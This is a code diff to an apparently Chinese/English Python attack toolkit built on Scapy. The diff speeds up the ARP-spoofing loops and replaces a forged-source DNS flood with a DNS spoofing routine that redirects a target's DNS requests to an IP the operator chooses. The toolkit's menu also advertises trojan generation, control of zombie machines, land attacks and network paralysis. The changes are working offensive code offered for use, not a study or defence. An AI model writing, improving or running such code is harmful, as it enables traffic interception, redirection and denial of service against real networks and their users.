@@ -158,7 +158,7 @@ class ARP_poof():
             try:
                 sendp(packet)
                 sendp(packet_two)
-                time.sleep(1)
+                time.sleep(0.1)
             except KeyboardInterrupt:
                 break
 
@@ -202,7 +202,7 @@ class ARP_poof():
                     break
                 sendp(packet)
                 sendp(packet_two)
-                time.sleep(1)
+                time.sleep(0.1)
             except KeyboardInterrupt:
                 break
 
@@ -223,7 +223,7 @@ class ARP_poof():
             try:
                 sendp(packet)
                 sendp(packet_two)
-                time.sleep(1)
+                time.sleep(0.1)
             except KeyboardInterrupt:
                 break
 
@@ -240,7 +240,7 @@ class ARP_poof():
         while True:#攻击主循环
             try:
                 sendp(packet,verbose=False)
-                time.sleep(1)
+                time.sleep(0.1)
             except KeyboardInterrupt:
                 break
 
@@ -258,7 +258,7 @@ class ARP_poof():
         while True:#攻击主循环
             try:
                 sendp(packet,verbose=False)
-                time.sleep(1)
+                time.sleep(0.1)
             except KeyboardInterrupt:
                 break
 
@@ -441,16 +441,22 @@ def trace_router():
     res, unans = traceroute(target, dport=dport, retry=-2)
     time.sleep(1)
 
-def DNS_pollution():
+def DNS_spoof():
     if chinses_mode:
-        dst_ip = input("请输入需要导向的IP:")
+        print("请选择模式")
+        print("将所有DNS请求导向至一个IP(1)")
+        print("将特定域名的请求导向至一个IP(2)")
     else:
-        dst_ip = input(":")
-    while True:
-        try:
-            send(IP(dst=dst_ip, src="192.168.3.1")/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="s96.cnzz.com")), verbose=0)
-        except KeyboardInterrupt:
-            break
+        print("Please select mode")
+        print("Redirect all DNS requests to one IP(1)")
+        print("Directing requests for a specific domain name to an IP(2)")
+    choose = input(">>>")
+    if choose == '1':
+        if chinses_mode:
+            rhost = input("请输入需要导向的IP:")
+        else:
+            rhost = input("Please enter the IP to be directed:")
+        dns_spoof(joker=rhost)
 
 def land_attack():
     if chinses_mode:
@@ -549,7 +555,7 @@ while True:#喜闻乐见的主循环
         print("Generate trojan virus(9)")
         print("Control zombie computer(10)")
         print("Trace router(11)")
-        print("DNS pollution(12)")
+        print("DNS poof(12)")
         print("land attack(13)")
         print("server background scan(14)")
         print("Paralysis the network(15)")
@@ -566,7 +572,7 @@ while True:#喜闻乐见的主循环
         print("生成木马病毒(9)")
         print("控制肉鸡(10)")
         print("路由跟踪(11)")
-        print("DNS污染(12)")
+        print("DNS欺骗(12)")
         print("land攻击(这个攻击很古老了 13)")
         print("服务器后台扫描(14)")
         print("瘫痪网络系统(ARP广播攻击 15)")
@@ -644,7 +650,7 @@ while True:#喜闻乐见的主循环
     elif choose == 11:
          trace_router()
     elif choose == 12:
-        DNS_pollution()
+        DNS_spoof()
     elif choose == 13:
         land_attack()
     elif choose == 14:
